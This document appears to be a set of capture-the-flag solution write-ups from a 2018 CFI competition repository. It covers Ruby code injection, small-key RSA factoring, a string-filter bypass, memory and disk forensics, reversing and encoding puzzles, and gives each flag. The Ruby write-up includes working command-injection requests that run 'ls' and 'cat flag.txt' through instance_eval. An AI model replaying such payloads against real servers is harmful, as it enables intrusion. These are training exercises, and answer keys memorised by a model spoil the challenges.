:frozen?, :methods, :singleton_methods, :protected_methods, :private_methods, :public_methods, :instance_variable_get, :instance_variables, :instance_variable_defined?, :!, :!=, :__send__, :equal?, :instance_eval, :instance_exec, :__id__]</textarea>
<!-- ... -->
```

There we have it! There is a lot of methods defined for the class `Tool`.


Let's check the private methods using [private_methods](https://ruby-doc.org/core-2.2.0/Object.html#method-i-private_methods):

```
message=test&method=private_methods
```

```html
<!-- ... -->
  <textarea>[:initialize, :inherited, :using, :attr, :attr_reader, :attr_writer, :attr_accessor, :remove_const, :remove_method, :method_added, :method_removed, :protected, :method_undefined, :undef_method, :public, :private, :initialize_copy, :initialize_clone, :alias_method, :included, :extended, :prepended, :define_method, :DelegateClass, :humanize, :Digest, :sprintf, :format, :Integer, :Float, :String, :Array, :Hash, :fail, :iterator?, :__method__, :catch, :__dir__, :loop, :global_variables, :throw, :block_given?, :raise, :__callee__, :eval, :URI, :j, :Rational, :trace_var, :untrace_var, :at_exit, :Complex, :set_trace_func, :gem, :select, :caller, :caller_locations, :`, :test, :fork, :exit, :JSON, :sleep, :jj, :respond_to_missing?, :load, :gem_original_require, :exec, :exit!, :syscall, :open, :printf, :print, :putc, :puts, :gets, :readlines, :readline, :initialize_dup, :p, :spawn, :rand, :srand, :proc, :lambda, :abort, :system, :trap, :require, :require_relative, :binding, :local_variables, :warn, :method_missing, :singleton_method_added, :singleton_method_removed, :singleton_method_undefined]</textarea>
<!-- ... -->  
```

Nice, the method [\`](https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60) is defined.

> `cmd` → string
> Returns the standard output of running cmd in a subshell. The built-in syntax %x{...} uses this method. Sets $? to the process status.

We could use the method [instance_variables](https://ruby-doc.org/core-2.2.0/Object.html#method-i-instance_variables) to execute private method. This way we could use the [\`](https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60) method and execute code on the serveur.

> instance_eval(string [, filename [, lineno]] ) → obj
> Evaluates a string containing Ruby source code, or the given block, within the context of the receiver (obj). In order to set the context, the variable self is set to obj while the code is executing, giving the code access to obj's instance variables and private methods.

Let's try to list the current directory:

```
message=`ls`&method=instance_eval
```

```html
<!-- ... -->
  <textarea>Gemfile
Gemfile.lock
app.rb
flag.txt
tool.rb
</textarea>
<!-- ... -->
```

Let's read the `flag.txt` file:

```
message=`cat flag.txt`&method=instance_eval
```

```html
<!-- ... -->
  <textarea>CFI{send_is_a_very_dangerous_method}</textarea>
<!-- ... -->  
```  

Got the flag 🎉!



### File: 2018-CFI-CTF/hercule/README.md

# hercule

They say you should never implement your own crypto algorithms.
This challenge displays one of the many implementation flaws you can find in a custom RSA.

Here is the flag. But it's encrypted with RSA. The padding algorithm is PKCS#5 with .
I'll provide you with the Public key : `Public key created : exp=65537, modulus=53528742297626831`

And here is the encrypted string : `[48944927437833612, 16618833042310571, 5184494133895961, 34925820981208595, 32624945606321423, 23493881996355757, 26922771394119503, 39459212340002548, 30566210251065891, 21336317446368629, 39157017037329648, 4769341917225250, 44809893317200587]`

Can you retrieve the secret key and decrypt the message?

> crypto

## Setup

Just run `pip install .` to install dependencies.

Then run `challenge.py` to generate an encrypted flag and the associated Public and Private keys

## Writeup

Looking at the Public key, we immediately notice the modulus is quite small for an asymmetric cryptography scheme.
We could probably bruteforce the `p` and `q` values used to create the modulus and recreate the private key.

We could use fancy factorisation algorithms like the general number field Sieve, but if the key is small enough, a simple trial division algorithm might suffice.
We use the following algorithm :

    def bruteforce(modulus: int) -> (int, int):
        radius = math.floor(math.sqrt(modulus))
        if radius % 2 == 0:
            radius -= 1
        while radius >= 3:
            if modulus % radius == 0:
                assert (modulus // radius) * radius == modulus
                print(f"Found a factorisation : {modulus//radius} * {radius} = {modulus}")
                return modulus // radius, radius
            radius -= 2

Using the square root saves time as we assume both number are probably of similar length which mean they must be under the square root of the result.

Quickly, the algorithm spits out the two primes factor of the modulus : `Found a factorisation : 235811647 * 226997873 = 53528742297626831`

Using those values, we can create the private key using the extended enclidian algorithm to find the modular inverse of the public exponent within the modulus

Turns out the secret is `secret=7597606795359425`. Decrypting the first value with this private key (using RSA formula `message = cipher^secret mod modulus`)
gives us the value `1128679803` which converted in hexadecimal gives `4346497b`. Decoded as ASCII we get `CFI{`, which indeed seems like the first part of the flag.

Decrypting every values gives us : `CFI{there_is_a_good_reason_why_rsa_keys_are_huge}\x03\x03\x03`. We then remove the padding and obtain our flag.




### File: 2018-CFI-CTF/introToPE/README.md

# IntroToPE

> reverse

Author: [jorkanofaln](https://github.com/jorkanofaln)

 a binary created on your friend Bill's platform


## Writeup

Open the binary in _DnSpy_

Click on `IntroToPE`

Go to the `IntroToPE.exe` menu

Open the `IntroToPE` classes

Go to the `verifyPasswd` class

Analyze the `verifyPasswd` function

Decode the string using [https://kt.gy/tools.html](https://kt.gy/tools.html)

There you have the flag! `CFI{.NetC#_1s_@w3s0m3}`






### File: 2018-CFI-CTF/kadyrovs_cat/README.md

# Kadyrov's Cat

> forensics

Author: [jorkanofaln](https://github.com/jorkanofaln)

A man from the soviet union has sent you two strange documents. Find the identity
of the man as well as his location.

Flag format is : `CFI{Firstname_Lastname_of_City}`


## Writeup

Use an exif data viewer for the image and find it's location

Find the geograhic coordonates and insert them in a longitude/latutude calculator

Read the pdf using a pdf reader and view it's properties

Then build the flag using the following Author_of_location

There you have the flag! `CFI{Kotik_Kadyrov_of_Riga}`




### File: 2018-CFI-CTF/magic_word/README.md

# Magic Word

> web

Author: [corb3nik](https://github.com/Corb3nik)

Hacking is all about thinking outside the box.

Can you figure out this simple puzzle?

http://localhost:17001


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

This challenge demonstrates a very common bypass that you can find in webapp security.

The gist of the challenge is the following :
- The app takes a word from the user through the `?magic_word=` argument.
- It then replaces all instances of `bumfuzzle` with an empty string
- Finally, it checks if `bumfuzzle` is still there, even after the replacements.

This is the behavior described above :
```
preg_replace("/bumfuzzle/", "", "hello") // Returns "hello"
preg_replace("/bumfuzzle/", "", "hellobumfuzzle") // Returns "hello"
preg_replace("/bumfuzzle/", "", "bumfasdfuzzle") // Returns "bumfasdfuzzle"
```

Since `bumfuzzle` is removed, a simple trick we can use is to embed `bumfuzzle` inside `bumfuzzle`.

The solution is the following :
```
preg_replace("/bumfuzzle/", "", "bumfbumfuzzleuzzle") // Returns "bumfuzzle"
```

You can find the flag by visiting this URL : `http://localhost:17001/?magic_word=bumfbumfuzzleuzzle`.



### File: 2018-CFI-CTF/maths/README.md

# maths

> programming

Author: [filedesless](https://github.com/filedesless)

Find the product of the digits of the sum of the first 10000 prime numbers


## Writeup

```haskell
import Data.Char

-- stolen prime generator
primes :: [Int]
primes = 2: 3: sieve (tail primes) [5,7..]
  where 
    sieve (p:ps) xs = h ++ sieve ps [x | x <- t, x `rem` p /= 0]  
      where (h,~(_:t)) = span (< p*p) xs

-- gets digits from string
digits :: String -> [Int]
digits s = map digitToInt s

-- find products of digits of the sum of ints
solve :: [Int] -> Int
solve p = product . digits . show $ sum p

-- enjoy
main = putStrLn . show . solve $ take 10000 primes
```



### File: 2018-CFI-CTF/powerPacker/README.md

# powerPacked

> reverse

Author: [jorkanofaln](https://github.com/jorkanofaln)

a packed powerpc 32bit compiled using anti-debugging


## Setup

Add challenge to the challenge repository

## Writeup

Open the binary in Hopper Disassembler in order to reverse engineer it.

Try to find the _main_ function.

Since the main function, doesn't exist scroll at the bottom of the disassembly page to find the packer used to obfuscate/pack the binary.

Then unpack the binary using the `upx -d` command.

Open the unpacked binary in Hopper.

Go to the _main_ function

Continue Analyzing the dissambled code 

find the the `0xffffe` number

substract it to the first string

There you have the flag! `CFI{i_love_powerpc}`




### File: 2018-CFI-CTF/serverless_cfi_λ/README.md

# serverless\_cfi\_λ

> programming

Author: [filedesless](https://github.com/filedesless)

This is a Haskell programming challenge. The user is required to make a small program that sorts given words (line by line, from stdin) by the sum  of their characters' ASCII values, and output them line by line to stdout. You can test your code in the web interface by pressing `submit` and the input, expected output, and actual output of your program will be sent back to you, or any compilation error that might have occured.


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

Here's an example solution:

```haskell
import Data.List( sortOn )

-- computes the value of a given string 
value :: String -> Int
value line = sum $ map fromEnum line

-- sort input lines by their value
main = interact $ unlines . sortOn value . lines
```

Uses the `interact` function which takes a `String -> String` function as a parameters, and applies it to stdin before outputting its result to stdout. The function passed to it (via the `$` right-associative function application operator) is the composition (via the `.` operator) `unlines . sortOn value . lines`. 

`unlines` and `lines` are opposite functions, of respective types `[String] -> String` and `String -> [String]`, and are equivalent to `join` and `split` in other languages.

`sortOn` of type `Ord b => (a -> b) -> [a] -> [a]` from the module `Data.List` sorts a given list based on the application of a given function to all elements of the given list, provided said function returns an orderable.

The function used to sort here is `value`, it does the required task of computing the sum of the ASCII values of the characthers composing a given word.


refs:

* https://www.haskell.org/hoogle/
* http://learnyouahaskell.com/chapters 



### File: 2018-CFI-CTF/thirteen-steps/README.md

# thirteen-steps

> crypto

Author: [enteris](https://github.com/Enteris)

Thirteen steps : Drinking like it's nineteen-ascii-85\
I know I need to do something thirteen times, but what could it be? All I have is a bunch of bytes...which also seem encoded

```
DGPA^T(1_>QVV_?8RQ2ANaQ%?O$hq88QTl4P!+F/8MFYUQs:)Q8Ps96O\-@E8MG7dO$2a+<=V[2SPsX>MILA2QVVL5Q;;V.SQBa48RZD=QVVL5N'5%tS/NTOQVn$@O\*HP<`3_;O$#W<QVha)O$D^8QrG8gO]QL)S5UW5O\](!M*-G3S.95BRgrqBCfY>\NaZR7SPsF/OC2S/OUbs4NDg$@EDLPd8O6pmP>c@,NaQ(A<=Ug9?RI@J8MP4nQ<eHDNb2e0R9F798R5"DM)jG#MG\P"Rgr)?M*T%$QW56BU0&5JQ=1uCQVhY7NDg$eQsa'>8PsK0NY&+TO\*H^MIU8.SIT5@NDhHDSQ9B;C0P>_O#5_u8O7N"QVq=*N=JCeNDg$)Qs^+$QW.t:Q;;\0Qs:huQXXU>M)jGtOAd?CB-b:OEYfp"QVn#!QWIb.NDhN0F$T3&NXfX1NDg%:MI@^7QXX'HNFQO&N=Ka58RcG;8KT!A=^`MSQVn$5S.9bUN_$(7Qj!c<M*T%u8Q/,#OUc93SRQ6D8R5"DSQ9B;F\d1dQO[N5R8!guNaaVTN_a5k8M>1cMcXI(QXas:RnmpE8Pa;-8RZVINXf'BO\-@9M)jG#MG\P"RpdMUO"!9%8RZ8DO#HL;QrG9;Qs=?>MHja-S5sXASIT\PNaZ(5S.9PB8P^PDN`o("Rnm(08Qf]C<t834R9'[?N`-a-SQBg?S.9PB8Ps5&RnmV/NaQ!DN`-.*NDjF'SmcEDO:F'rRpfrDM*T%u8Ru>CO#Gs,O$B3=N`-;3OW4d#O\*H^MIU8.SIT5@NDhHDM@O<*T2RDDO$#W<QVha)O$D^D8R)DE8PsT4MIL4#8PjbJDHgnaNXeIWSl0RA8QTkF=sc7T<=W&LSPsL@N_$',QOYf&?m74;Q<d+.N&otr8PjbJC-^+\Pu8flSmZZ?T(1tJ8KT$>=rJTbQVn$?SPO3,MI9%%UJkc=Me=5mCc>Cc8PaJCEa3djRp9I:O$M$,Pm$itPuDD/MH'%3C0GY_MGRr!8N^!:8K]3sE^D-?;@[KO8KT$A=W@j2O#H7#MIK(<8P^PCO%H@]Qs^,NNaue3<_!SF8PsK0NY&+WMI@^7QXX'HNFQO&N=KL98RcG;8OG1%<t7U0Q=hD3O#ZI$Pm$6mRpL5OO$B3EO\*I3MIL44=sl7SS/`_O8IcqY1CbUC8M(4nNXfj;8P^P6Ptt+.N'QjAU0VtW@g(qgEbS$rM)seG?;54JLf+l2N_OY,MG[#bN`9\tM)sY$SP=:4MHjSuNaQLuMbeJu?Qrp]QVha)O$D_@
```

Here are some interesting reads: 
 - https://en.wikipedia.org/wiki/Caesar_cipher
 - https://en.wikipedia.org/wiki/Ascii85


## Setup

- Create a new _virtualenv_ to preserve your python installation.
- Install the dependencies with `pip install .`
- Simply give the string you want to encode as a parameter to the `step_encode()` function to create the encoded flag.
- You may use `step_decode()` to decode the obtained flag.

## Writeup

It would seem we have a base85 encoded string to start the challenge.
Decoding it gives us : 
> nOt\xb5\x9e\xf1\xe0\x01\x97Ot\xc2I\`g\xb9\x8e\`Z\x7f\x8fC\xe3\x0bIWp\xac\x92=\x83\x10I0c\xac\x98\\\r\x83IQk\xb9\x91J\x15\x88I0t\xaa\x

That won't do it. We have a bunch of unusual bytes here, like 97 and e0. This probably means that something happened to
 the encoded string in order to obtain our initial text. 
 
 The challenge mention thirteen, which might refers to ROT-13, a commonly used "cipher".
 
 By rotating by 13 the bytes values before we decode the ascii85...
 > ValueError: Non-Ascii85 digit found: 
 
 Oh. I guess we are out of bounds. But pray tell, what are ascii85 bounds?
 
 Reading some more about ascii85, we notice that the
 printable space is shifted by 33, in order to get characters ranging from `!` to `u`
 
 By adding the shift, we obtain : 
 >  Early binary repertoires include Bacon's cipher, Braille [...] \
 Here is a flag for you : CFI{ascii85_is_more_space_efficient_than_mere_base64_encoding}
 
 Success :D



### File: 2018-CFI-CTF/unix_drive/README.md

# UnixDrive

> forensics

Author: [jorkanofaln](https://github.com/jorkanofaln)

A Captured ext2 formatted drive with hidden files


## Writeup

Download the archive in a Kali Linux Virtual Machine and complete the following steps as root:

Extract the archive using the following command: `tar -xvf  UnixDrive.tar.xz`

Install the `libewf` package on kali linux: `apt install ewf-tools`

Open a Terminal and type the following commands:

```shell
mkdir /mnt/E01Drive/

ewfmount unixDrive.E01 /mnt/E01Drive/

cd /mnt/E01Drive/

fdisk -l ewf1

mkdir /mnt/dd

mount -o ro,loop,offset=1048576 ewf1 /mnt/dd/ 

cd /mnt/dd

ls -lah

cd .private

ls -lah

cat .flag.txt 
```

There you have the flag! `FLAG: CFI{Hidden_F1l3s_F0ld3rs_D3c3pt1on}`



### File: 2018-CFI-CTF/webLogon-capture/README.md

# webLogon capture

> forensics

Author: [jorkanofaln](https://github.com/jorkanofaln)

An network capture to an insecure network 


## Writeup

Open Wireshark

Follow the the TCP Stream

Find the password field: `%20%43%46%49%7b%31%6e%73%33%63%75%72%33%5f%6c%30%67%30%6e%7d%20`

visit [https://kt.gy/tools.html](https://kt.gy/tools.html) and URL decode the password

There you have the flag! `CFI{1ns3cur3_l0g0n}`



### File: 2018-CFI-CTF/windows_xp_mem_part1/README.md

# Windows_XP_mem_part_1

> forensics

Author: [jorkanofaln](https://github.com/jorkanofaln)

A Windows XP SP3 memory capture with some secrets.


## Writeup

Use `tar -xvf memSecret.tar.xz` to extract the memory capture file

Use the volatility to find out which profile to use: `volatility imageinfo -f winxpMem.mem`

```
Output:
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/jorkano/Data/winxpMem.mem)
                      PAE type : PAE
                           DTB : 0x334000L
                          KDBG : 0x80545ae0L
          Number of Processors : 1
     Image Type (Service Pack) : 3
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2018-05-20 21:32:21 UTC+0000
     Image local date and time : 2018-05-20 17:32:21 -0400

Use the notepad plugin to extract the image's secrets:
Output:
Volatility Foundation Volatility Framework 2.6
Process: 3740
Text:
Ask Commander Shepperd for help
Steal a clone, from a rich and powerful person
Here is my secret:
Volatility Foundation Volatility Framework 2.6
Process: 3740
Text:
?

Text:
d

Text:


Text:
?

Text:
Ask Commander Shepperd for help
Steal a clone, from a rich and powerful person
Here is my secret:
CFI{Notepad_0riana_secret_is_ins3cur3}
```

There you have the flag! `CFI{Notepad_0riana_secret_is_ins3cur3}`



### File: 2018-CFI-CTF/windows_xp_mem_part2/README.md

# Windows XP mem part 2

> forensics

Author: [jorkanofaln](https://github.com/jorkanofaln)

Windows XP SP3 memory capture with internet explorer 8 history 


## Writeup

Use `tar -xvf` command to extract the file in the `ieSecret.tar.xz` archive

Use the volatility to find out which profile to use: `volatility imageinfo -f internetExplorer.mem`

```
Use Volatility to find the OS image version: volatility imageinfo -f internetExplorer.mem

Output:
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/media/jorkano/FreeAgent GoFlex Drive/Neue Ordner/internetExplorer.mem)
                      PAE type : PAE
                           DTB : 0x334000L
                          KDBG : 0x80545ae0L
          Number of Processors : 1
     Image Type (Service Pack) : 3
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2018-05-27 00:31:37 UTC+0000
     Image local date and time : 2018-05-26 20:31:37 -0400

Then use the Windows XP SP3 profile and use the internet explorer plugin: volatility --profile=WinXPSP2x86 iehistory -f internetExplorer.mem
Output:
Volatility Foundation Volatility Framework 2.6
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x1d8945
Last modified: 2018-05-26 20:30:24 UTC+0000
Last accessed: 2018-05-27 00:30:26 UTC+0000
URL: Administrator@https://www.google.com/url?url=https://www.theguardian.com/us&rct=j&frm=1&q=&esrc=s&sa=U&ved=0ahUKEwiKmITz5KHbAhXO2qQKHUMuCoEQFggVMAA&usg=AOvVaw0EduAwOOfzz74wHifeqwLw
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x1d8c8d
Last modified: 2018-05-26 20:30:24 UTC+0000
Last accessed: 2018-05-27 00:30:26 UTC+0000
URL: Administrator@https://www.google.com/url?url=https://www.theguardian.com/us&rct=j&frm=1&q=&esrc=s&sa=U&ved=0ahUKEwiKmITz5KHbAhXO2qQKHUMuCoEQFggVMAA&usg=AOvVaw0EduAwOOfzz74wHifeqwLw
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x1d931d
Last modified: 2018-05-26 20:30:24 UTC+0000
Last accessed: 2018-05-27 00:30:26 UTC+0000
URL: Administrator@https://www.google.com/url?url=https://www.theguardian.com/us&rct=j&frm=1&q=&esrc=s&sa=U&ved=0ahUKEwiKmITz5KHbAhXO2qQKHUMuCoEQFggVMAA&usg=AOvVaw0EduAwOOfzz74wHifeqwLw
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x23a455
Last modified: 2018-05-26 20:30:07 UTC+0000
Last accessed: 2018-05-27 00:30:08 UTC+0000
URL: Administrator@https://www.google.com/search?q=+CFI%7BH1kw3d_and_sp1ed_in_m3l@yu%7D&hl=de&gbv=2&oq=+CFI%7BH1kw3d_and_sp1ed_in_m3l@yu%7D&gs_l=heirloom-serp.3...2343.2343.0.2671.1.1.0.0.0.0.172.172.0j1.1.0....0...1ac.1.34.heirloom-serp..1.0.0.WGjpw8ohe4U
Title: CFI{H1kw3d_and_sp1ed_in_m3l@yu} - Google-Suche
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x23a89d
Last modified: 2018-05-26 20:30:07 UTC+0000
Last accessed: 2018-05-27 00:30:08 UTC+0000
URL: Administrator@https://www.google.com/search?q=+CFI%7BH1kw3d_and_sp1ed_in_m3l@yu%7D&hl=de&gbv=2&oq=+CFI%7BH1kw3d_and_sp1ed_in_m3l@yu%7D&gs_l=heirloom-serp.3...2343.2343.0.2671.1.1.0.0.0.0.172.172.0j1.1.0....0...1ac.1.34.heirloom-serp..1.0.0.WGjpw8ohe4U
Title: CFI{H1kw3d_and_sp1ed_in_m3l@yu} - Google-Suche
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x3e38f65
Last modified: 2018-05-26 20:30:18 UTC+0000
Last accessed: 2018-05-27 00:30:20 UTC+0000
URL: Administrator@https://www.googl
**************************************************
Process: 2512 iexplore.exe
Cache type "DEST" at 0x450ac65
Last modified: 2018-05-26 20:30:51 UTC+0000
Last accessed: 2018-05-27 00:30:52 UTC+0000
URL: Administrator@https://www.theguardian.com/us
Title: News, sport and opinion from the Guardian's US edition | The Guardian
```

There you have the flag! `FLAG: CFI{H1kw3d_and_sp1ed_in_m3l@yu}`





### File: 2018-CFI-CTF/awesome-cats/src/secret/journal.md

# Journal

## Entry 2013-08-20

Today I walk down the street to get some milk to the grocery store - I was hoping to make a friend. When suddenly I saw I cat looking at me from a window. He was so cute!!! Since that day I'm in love with cats.

## Entry 2014-12-24

Today I learn about `robots.txt` and how it can block bot from crawling and indexing my website.

## Entry 2018-05-16

Today I went to the park - hoping to make a friend. I made no friend, but I found a weird inscription on a bench: `CFI{nothing_sensitive_goes_in_robots.txt}`. I don't know what that means. 




### File: 2018-CFI-CTF/awesome-cats/src/secret/nodes.md

# My notes

## PHP 

> https://learnxinyminutes.com/docs/php/

```
<?php // PHP code must be enclosed with <?php tags

// If your php file only contains PHP code, it is best practice
// to omit the php closing tag to prevent accidental output.

// Two forward slashes start a one-line comment.

# So will a hash (aka pound symbol) but // is more common

/*
     Surrounding text in slash-asterisk and asterisk-slash
     makes it a multi-line comment.
*/
```

## Database

### SQL

> https://www.w3schools.com/sql/

SQL is a standard language for storing, manipulating and retrieving data in databases.

Our SQL tutorial will teach you how to use SQL in: MySQL, SQL Server, MS Access, Oracle, Sybase, Informix, Postgres, and other database systems.

```SQL
SELECT * FROM Customers;
```



### File: 2018-CFI-CTF/awesome-cats/src/secret/secret.md

# Secret

I love cats. ;)


### File: 2018-CFI-CTF/awesome-cats/src/secret/todo.md

# TODO

- [x] learn markdown
- [ ] learn php
- [ ] learn database
- [ ] learn javascript
- [x] learn HTML
- [x] learn CSS
- [ ] buy some milk
- [ ] workout
- [ ] find some friends to have fun with
- [x] learn _robots.txt_ (to keep my private stuff away from bad eyes)
- [ ] write more often in my journal
- [ ] have a better todo system
